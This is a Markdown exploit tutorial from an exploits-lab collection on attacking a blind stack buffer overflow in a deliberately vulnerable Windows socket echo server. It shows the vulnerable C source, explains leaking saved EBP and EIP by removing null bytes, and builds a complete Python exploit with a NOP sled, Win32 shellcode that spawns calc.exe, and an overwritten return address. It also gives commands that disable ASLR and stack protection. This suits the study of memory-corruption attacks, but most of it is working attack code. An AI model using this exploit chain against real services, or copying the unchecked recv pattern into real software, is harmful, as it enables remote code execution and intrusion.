# Exploits
## Blind Stack Buffer Overflow - Via data leakage (not format strings)
This is an example of what you can do with information leakage while exploiting a stack buffer overflow

This is not Blind Return Oriented Programming but this is an example of how you can exploit a Blind Stack Buffer Overflow  
A Blind Exploit happens when the attacker doesn't have any information neither about the binary he's exploiting nor its source code  
It's usually happening through sockets, so in an online connection  
So here's the source code of the target : https://github.com/TheCrazzXz/Exploits-Lab/tree/main/App-sys/windows_based/Blind%20Stack%20Buffer%20Overflow%20-%20Via%20Leakage  
`main.c` :
```c
#include <stdio.h>
#include <stdlib.h>
#include "SocketServer.h"

#pragma comment(lib,"ws2_32.lib") //Winsock Library

unsigned long recv_size;

void client_function()
{
	char buffer[1024];
	memset(buffer, 0, 1024); // Zero memory the bufer
	if (recv_size = recv(new_socket, buffer, 1200, 0) == SOCKET_ERROR)
	{
		puts("Recv failed");
		exit(1);
	}
	if(send(new_socket, buffer, strlen(buffer), 0) < 0)
	{
		puts("Send failed");
		exit(1);
	}
}

int main(void)
{
	initializeListeningServer(7777);
	
	while(1)
	{
		acceptConnection();
		
		client_function();

		closesocket(new_socket);
	}

	Disconnect();
}
```
`SocketServer.h` :
```c
#include <io.h>
#include <stdio.h>
#include <winsock2.h>

#pragma once

#ifndef __SOCKET_SERVER__
#define __SOCKET_SERVER__

WSADATA wsa;
SOCKET s , new_socket;
struct sockaddr_in server , client;
int c;

int initializeListeningServer(int port)
{	
	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
	{
		printf("Failed. Error Code : %d",WSAGetLastError());
		exit(1);
	}
	
	printf("Initialised.\n");
	
	//Create a socket
	if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d" , WSAGetLastError());
		exit(1);
	}

	printf("Socket created.\n");
	
	//Prepare the sockaddr_in structure
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons( port );
	
	//Bind
	if( bind(s ,(struct sockaddr *)&server , sizeof(server)) == SOCKET_ERROR)
	{
		printf("Bind failed with error code : %d" , WSAGetLastError());
		exit(1);
	}
	
	puts("Bind done");

	//Listen to incoming connections
	listen(s , 3);
	
	//Accept and incoming connection
	puts("Waiting for incoming connections...");
	
}
void acceptConnection()
{
	c = sizeof(struct sockaddr_in);
	new_socket = accept(s , (struct sockaddr *)&client, &c);
	if (new_socket == INVALID_SOCKET)
	{
		printf("accept failed with error code : %d" , WSAGetLastError());
		exit(1);
	}
	
	puts("Connection accepted");
}
void Disconnect()
{
	printf("Disconnecting...\n");
	closesocket(new_socket);
	closesocket(s);
	WSACleanup();
	printf("Disconnected\n");
}

#endif
```
As you can see this uses windows functions so i compiled it in windows, but the attack is pretty much the same in Linux if you know about stack buffer overflows  
As you can see there's this call to `initializeListeningServer(7777)` which will simply `initialize` a `Listening` `Server` on port `7777` !  
Then there's a loop that accepts a client and then calls `client_function` and then it closes the socket, it can accept multiple clients, once its done with one, another one can connect, then another one...  
I compiled it with :
```
gcc <source file>.c -o <executable> -lws2_32
(you can also add -fno-stack-protector)
``` 
If you compile a linux version on Linux, make sure to disable to stack protector, NX and ASLR :
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
gcc <source file.c> -o <executable> -fno-stack-protector -z execstack
```
**Compiled in 32 bits**  
Now we start it and we have our program listening on port 7777 but it could be listening on any port  
So we can use netcat to connect to it :
```
nc <server address> <port (example : 7777)>
```
Netcat is a simple program that redirects stdin to a socket, which is in this case the one we use to connect to the server  
Let's enter `I hate fµKers` for example :
It responds with :
```
I hate fµKers
```
So basically it sends the string we entred  
Now you know what's happening here, there's a stack buffer overflow !  
If we enter more than 1024 we overflow the buffer and so we can overwrite data after the buffer on te stack !  
If you take a look at `client_function` you can read the following :
```c
void client_function()
{
	char buffer[1024];
	memset(buffer, 0, 1024); // Zero memory the bufer
	if (recv_size = recv(new_socket, buffer, 1200, 0) == SOCKET_ERROR)
	{
		puts("Recv failed");
		exit(1);
	}
	if(send(new_socket, buffer, strlen(buffer), 0) < 0)
	{
		puts("Send failed");
		exit(1);
	}
}
```
So we allocate a buffer of 1024 bytes on the stack  
Then we set all these 1024 bytes to 0  
Then we receive data, until 1200 bytes, exceeding the size of the buffer, so here is our overflow  
Then we send back the data, and we send `strlen(buffer)` bytes  
`strlen` is a function in GLIBC which takes a pointer and simply increments the address at each iteration, and if at a certain address there's a NULL-Byte (0) then the function returns the number of iterations it took before the NULL-Byte (0), and it can be used to find the length of a string because a string in C is NULL-Terminated, so it's followed by a NULL-Byte after the characters  
For example : Let's say we have a buffer of 62 characters, let's say we do an strcpy :
```c
strcpy(buffer, "Hello");
```
What you have to know is that when you type a string in c with `"<string>"` is that it allocates it on the buffer it's asigned to (in this case .data then it's copied to the buffer with the strcpy) and the buffer size is the length of the characters + 1 so + 1 to put a NULL Byte Terminator at the end, to terminate the string  
So here is the "Hello" which is allocated in .data in memory :
```
'H', 'e', 'l', 'l', 'o', 0x00 (Null terminator)
```
When we recv, our buffer is 1024 characters, and since our buffer is full of 0's (NULL bytes), when we receive to the buffer, the data we receive doesn't necessarly have to have to a null byte to it, because the buffer is already full of null bytes, so if we receive "I hate fµKers"` we get :
Before recv :
```
Buffer : 0x00, 0x00, 0x00, 0x00 ... (1024)
```
After recv :
```
Buffer : 'I', ' ', 'h', 'a', 't', 'e', ' ', 'f', 'µ', 'K', 'e', 'r', 's', 0x00, 0x00, 0x00, 0x00 (null bytes until the end)
```
That's why it's null terminated  
Then we we send, it sends all data before the null byte because of the strlen, so it sends exactly :
```
'I', ' ', 'h', 'a', 't', 'e', ' ', 'f', 'µ', 'K', 'e', 'r', 's'
```
So `strlen` returned all data size before the first null byte in the buffer  

Now there's a stack buffer overflow, if we enter more than 1024 characters as aforementionned  
The thing is that, we have no information about the binary, no gdb session we can create to debug it, no format string leakage things...  
But still it's possible to execute a shellcode on it, the way we can do this is abusing the program logic and particularly the way `strlen` uses null bytes  
We agreed to say that if we overflow a buffer we have the control of it, and here even more than if we had just a `gets` or a `scanf` read doesn't add any null byte after the data we receive to the buffer in opposite the these 2 functions, therefore we can just remove null bytes from the buffer, because :  
Before overflow
```
Buffer : 0x00 (1024)
```
Now if we enter exactly 1024 non-null bytes :
```
Buffer : <non null byte> (1024)
```
So we don't have any null byte, this way the data which is just after the buffer is now also sent !  
For me the stack is like this :
```
buffer (1024)
8 byte data (unimportant stuff)
EBP save
EIP save
```
The 8 byte data is divided in two addresses which are unimportant, so we can overwrite them with non-null charaters, assuming that we filled the buffer with non-null characters  
Of course the stack layout may change for you (at least after the buffer)  
We want to get EBP this way we can guess the address of the buffer, and it's extremely simple, we can simply send :
```
<non-null byte>*1024 + <non null byte>*8
```
And so since we overwrote all null bytes, it will now leak from `buffer+1024+8`to the first null byte, basically in the data we leak, if it stops, then we know, just after the data we leaked there's a null-byte, it's basically the same thing that you can do when you leak the binary while doing Blind Retun Oriented Programming  
For me `EBP save` is `0x0061ff28`, so it's a 32 bits (4 byte) address so in memory it looks like this :
```
0x28 ; 0xff ; 0x61 ; 0x00
```
So it will leak `0x28;0xff;0x61` bytes then it will stop the leakage but we know there's a null byte just after that because it stopped here  
I took the example of `EBP` save but you could leak any data from the address of the buffer by doing :
```
1024 non-null-bytes ; offset from the end of the buffer of the data you want to leak to before the data to leak 
```
And it will leak until null byte  
So for example if we want to leak `EIP` save, since it's just after `EBP` save, we can do :
```
1024 non-null-bytes ; 8 non-null bytes ; 4 non-null bytes
BUFFER                                   ; EBP save
```
And it will leak from `EIP` save until it finds a null byte, you can also leak the uninmportant data by just sending 1024 non-null bytes  
Let's develop an exploit for this :
```python
import socket
import struct

BUF_SIZE = 1024 # Size of the buffer

sock = socket.socket()
sock.connect(("127.0.0.1", <port>))

sock.close()
```
So we connect to the server (in this case it's hosted on `localhost`) on the port it's listening on    
Let's send 1024 bytes so we see what happens :
```python
import socket
import struct

BUF_SIZE = 1024 # Size of the buffer

sock = socket.socket()
sock.connect(("127.0.0.1", <port>))

payload = n"A"*BUF_SIZE
sock.send(payload)

print(sock.recv(1024+4))

sock.close()
```
We receive 4 bytes to see what's there :
```
(A lot of 'A's) \xcaGt
```
This is what i recieve, so a space, a 0xca, a G and a t  
So `0x20`, `0xca`, `0x47`, `0x74`  
So we know that between `buffer+1024` and `buffer+1024+4` there is this data, now we want `EBP` save  
Let's make a function to leak data at an offset from the end of the buffer :
```python
# Returns an array range :
# Example : array_division(['A', 'B', 'C', 'D', 'E'], 2, 4) returns : ['B', 'C', 'D']
def array_division(arr, start_idx, end_idx=None):
    if end_idx == None:
        e_idx = len(arr)-1
    else:
        e_idx = end_idx
    new_arr = []
    i = start_idx
    while i <= e_idx:
        new_arr.append(arr[i])
        i += 1
    return new_arr

def leak_stack_buf_offset(sock, start_payload, buf_size, offset):
    payload = start_payload
    payload += b"B"*offset
    sock.send(payload)

    resp = sock.recv(buf_size+offset+4)
    #print(resp)
    #print(len(resp))
    leaked_bytes = bytes(array_division(resp, buf_size+offset, len(resp)-1))
    leak = leaked_bytes + b"\x00"*(4 - len(leaked_bytes))

    leaked_addr = struct.unpack("I", leak)[0]
    return leaked_addr
```
We can use this function to leak 4 bytes of an offset from the end of the buffer :
For example :
```python
BUF_SIZE = 1024

sock = socket.socket()
sock.connect(("127.0.0.1", 7777))

payload = b"A"*BUF_SIZE

print("Leak : "+hex(leak_stack_buf_offset(sock, payload, BUF_SIZE, 0)))
```
And we get :
```
Leak : 0x7447ca20
```
This is the 4-byte-sequence we got earlier  
If we want to leak EIP backup for example :
```python
BUF_SIZE = 1024

sock = socket.socket()
sock.connect(("127.0.0.1", 7777))

payload = b"A"*BUF_SIZE

print("Leak : "+hex(leak_stack_buf_offset(sock, payload, BUF_SIZE, 4*3)))
```
So offset from the end of the buffer is `12`  
And we get :
```
Leak : 0x40176e
```
Now here we want to inject a shellcode to the server, so we need the address of the buffer, since we have `EBP` backup it's simple  
Now here is what `client_function` does :
```
push ebp
mov ebp, esp
sub esp, 0x418
```
So we save current `ebp` on the stack, we set `ebp` to current `esp` then we allocate enough space for our function variables, so `0x418` is enough place for our buffer  
So when we leak `ebp` we get `ebp` from the `push ebp` which is before the allocation of our buffer  
Our stack looks like this :
```
|-0x418| BUFFER (1024 bytes) <---- ESP (STACK POINTER)
|-0x18 | DATA (8 bytes)
|-0x10 | EBP backup (4 bytes)
|-0xc  | EIP backup/Return pointer (4 bytes) <---- EBP (BASE POINTER)
|-0x2c | ... <--- Previous EBP (from main)
```
So the `EBP backup` value we get is `0x20`=`32` bytes away from the new `EBP` value, but the stack layout depends on the system and the program, so there are big chances it's not the same for you so we can't just say the `EBP` backup value is always 32 bytes away from `EBP` value, because for me it's the case but it might not be the same for every system  
So we want to place our shellcode in the buffer and then overwrite the `EIP` backup or Return Pointer with the address of the buffer, we could exactly calculate where is the buffer from the informations i gave you, but remember, normally this is **Blind** stack buffer overflow thus you can't have any information for the binary, these are all assumptions  
So let's use the trick with nopslide while doing a shellcode injection (https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explt/Stack-buffer-overflow/Shellcode-injection.md if you want to see my article on it) $we_knew_it_all_away  
So the layout of the buffer is gonna be like :
```
NOP instruction (times 1024 - shellcode length - Post-Shellcode-Nops length )
Shellcode 
Post-Shellcode-Nops
```
So we put our shellcode after the pre-shellcode NOPS, thus if we hit a pre-shellcode NOP, it will continue until the shellcode, also you can see that i added Post-Shellcode NOPS, this is because we don't want the shellcode to corrupt itself or doing anything wrong with itself while using the stack, so i will simply add like 32 Post-Shellcode NOPS, and all this has the eventually correspond to the size/length of the buffer (`sizeof(char)=1`)  
We then want to jump like 512 bytes before `EBP` so we're sure we hit our NOPS in our Pre-Shellcode NOP slide  
```python
import socket
import struct
import time

def array_division(arr, start_idx, end_idx=None):
    if end_idx == None:
        e_idx = len(arr)-1
    else:
        e_idx = end_idx
    new_arr = []
    i = start_idx
    while i <= e_idx:
        new_arr.append(arr[i])
        i += 1
    return new_arr

def leak_stack_buf_offset(sock, start_payload, buf_size, offset):
    payload = start_payload
    payload += b"B"*offset
    sock.send(payload)

    resp = sock.recv(buf_size+offset+4)
    #print(resp)
    #print(len(resp))
    leaked_bytes = bytes(array_division(resp, buf_size+offset, len(resp)-1))
    leak = leaked_bytes + b"\x00"*(4 - len(leaked_bytes))

    leaked_addr = struct.unpack("I", leak)[0]
    return leaked_addr
    
BUF_SIZE = 1024

sock = socket.socket()
sock.connect(("127.0.0.1", 7777))

pay = b"\x90"*(BUF_SIZE - len(shellcode))
pay += shellcode

ebp_save = leak_stack_buf_offset(sock, pay, BUF_SIZE, 8)
print("EBP save : "+hex(ebp_save))
sock.close()
```
As you can see first we leak the address of `EBP` which is 8 bytes away from the end of the buffer  
Now we calculate an address where we're sure to hit our Pre-Shellcode NOPS so let's say `EBP` backup value - `512` :
```
in_nopslide_addr = ebp_save-512
print("Address in NOPSLIDE : "+hex(in_nopslide_addr))
```
Then we connect again and we send our final payload  
The shellcode i'm gonna use is a shellcode that spawns a `calc.exe` process on windows but you know that if you're on linux you can use a shellcode to spawn a root shell
```python

# Spawn calc.exe Win32
shellcode = b"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
shellcode += b"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
shellcode += b"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
shellcode += b"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
shellcode += b"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
shellcode += b"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
shellcode += b"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
shellcode += b"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
shellcode += b"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
shellcode += b"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
shellcode += b"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
shellcode += b"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
shellcode += b"\x52\xff\xd0"

sock = socket.socket()
sock.connect(("127.0.0.1", 7777))

pay = b"\x90"*(BUF_SIZE - len(shellcode) - 32) # Pre
pay += shellcode # Self-Explainatory
pay += b"\x90"*32 # Post
pay += b"B"*4 # Data
pay += b"B"*4 # Data
pay += struct.pack("I", ebp_save) # Since we have it why not 
pay += struct.pack("I", in_nopslide_addr) # EIP backup, we jump to our NOPS !

#print(len(pay))

#print(pay)

time.sleep(1)

sock.send(pay)

sock.close()
```
So here is the final exploit :
```python
import socket
import struct
import time
shellcode = b"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
shellcode += b"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
shellcode += b"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
shellcode += b"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
shellcode += b"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
shellcode += b"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
shellcode += b"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
shellcode += b"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
shellcode += b"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
shellcode += b"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
shellcode += b"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
shellcode += b"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
shellcode += b"\x52\xff\xd0"

def array_division(arr, start_idx, end_idx=None):
    if end_idx == None:
        e_idx = len(arr)-1
    else:
        e_idx = end_idx
    new_arr = []
    i = start_idx
    while i <= e_idx:
        new_arr.append(arr[i])
        i += 1
    return new_arr

def leak_stack_buf_offset(sock, start_payload, buf_size, offset):
    payload = start_payload
    payload += b"B"*offset
    sock.send(payload)

    resp = sock.recv(buf_size+offset+4)
    #print(resp)
    #print(len(resp))
    leaked_bytes = bytes(array_division(resp, buf_size+offset, len(resp)-1))
    leak = leaked_bytes + b"\x00"*(4 - len(leaked_bytes))

    leaked_addr = struct.unpack("I", leak)[0]
    return leaked_addr

def leak_stack_from_buf():
    i = 0

    while 1:

        sock = socket.socket()
        sock.connect(("127.0.0.1", 7777))
        
        #print("At buffer + "+str(i))
        addr = leak_stack_buf_offset(sock, i)
        
        print(hex(addr))
        
        sock.close()
        input()
        i += 4
        
#leak_stack_from_buf()

BUF_SIZE = 1024

sock = socket.socket()
sock.connect(("127.0.0.1", 7777))

pay = b"\x90"*(BUF_SIZE - len(shellcode))
pay += shellcode

ebp_save = leak_stack_buf_offset(sock, pay, BUF_SIZE, 8)
print("EBP save : "+hex(ebp_save))
sock.close()

in_nopslide_addr = ebp_save-512
print("Address in NOPSLIDE : "+hex(in_nopslide_addr))

sock = socket.socket()
sock.connect(("127.0.0.1", 7777))

pay = b"\x90"*(BUF_SIZE - len(shellcode) - 32)
pay += shellcode
pay += b"\x90"*32
pay += b"B"*4 # Data
pay += b"B"*4 # Data
pay += struct.pack("I", ebp_save)
pay += struct.pack("I", in_nopslide_addr)

#print(len(pay))

#print(pay)

time.sleep(1)

sock.send(pay)

sock.close()
```
And our shellcode is executed  
Thanks for reading
